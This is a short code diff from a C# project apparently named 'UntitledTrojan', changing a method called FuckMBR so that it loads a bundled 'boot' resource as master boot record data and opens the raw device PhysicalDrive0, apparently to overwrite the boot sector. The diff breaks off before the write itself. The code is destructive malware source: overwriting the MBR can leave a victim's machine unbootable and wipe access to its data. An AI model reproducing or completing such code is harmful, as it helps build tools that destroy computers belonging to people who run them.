@@ -4,6 +4,7 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using UntitledTrojan.Properties;
 
 namespace UntitledTrojan.Tools
 {
@@ -35,7 +36,7 @@ namespace UntitledTrojan.Tools
 
         public static void FuckMBR()
         {
-            var mbrData = new byte[MbrSize];
+            var mbrData = Resources.boot;
 
             var mbr = CreateFile(
                 "\\\\.\\PhysicalDrive0",
